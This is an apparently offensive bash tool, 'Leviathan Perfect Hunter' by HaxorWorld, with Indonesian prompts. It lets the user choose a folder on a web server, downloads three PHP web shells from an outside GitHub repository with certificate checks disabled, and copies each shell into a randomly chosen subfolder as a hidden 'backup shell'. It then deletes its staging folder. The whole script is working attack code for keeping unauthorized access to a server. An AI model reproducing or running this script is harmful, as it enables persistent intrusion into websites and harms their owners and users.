#!/bin/bash

show_deepest_folders() {
    local target_folder="$1"
    local folder_list=()

    while IFS= read -r -d '' dir; do
        folder_list+=("$dir")
    done < <(find "$target_folder" -mindepth 1 -maxdepth 10 -type d -print0 | xargs -0 -I{} sh -c 'echo {}; find "{}" -mindepth 1 -maxdepth 10 -type d | wc -l')

    for ((i = 0; i < ${#folder_list[@]}; i++)); do
        echo -e "\e[32m$((i+1)). $(basename "${folder_list[$i]}") (Subfolder: ${folder_list[$i+1]})\e[0m"
        ((i++))
    done
}
echo -e "\e[33m..::Leviathan Perfect Hunter::..\e[0m"
echo -e "\e[32mPilih folder tujuan untuk backup shell:\e[0m"
select target_folder in */; do
    if [ -n "$target_folder" ]; then
        echo -e "\e[32mFolder terdalam di dalam folder tujuan:\e[0m"
        show_deepest_folders "$target_folder"
        break
    else
        echo -e "\e[31mPilih yang bener dong.\e[0m"
    fi
done

echo -e "\e[32mAnda telah memilih folder tujuan: $target_folder\e[0m"

echo -e "\e[32mTunggu 3 detik...\e[0m"
sleep 3

mkdir x

echo -e "\e[32mMengunduh shell ke dalam folder 'x'...\e[0m"
wget --no-verbose --no-check-certificate -qP x https://raw.githubusercontent.com/oxygencall/shell/main/xf.php
wget --no-verbose --no-check-certificate -qP x https://raw.githubusercontent.com/oxygencall/shell/main/us.php
wget --no-verbose --no-check-certificate -qP x https://raw.githubusercontent.com/oxygencall/shell/main/hd.php

echo -e "\e[32mMenyalin shell ke dalam folder tujuan...\e[0m"
for file in x/*.php; do
    random_folder=$(find "$target_folder" -type d | shuf -n 1)
    cp "$file" "$random_folder/$(basename "$file")"
    echo -e "\e[32mShell berhasil disalin ke: $random_folder/$(basename "$file")\e[0m"
done
rm -rf x

echo -e "\e[32mCoded By HaxorWorld.\e[0m"
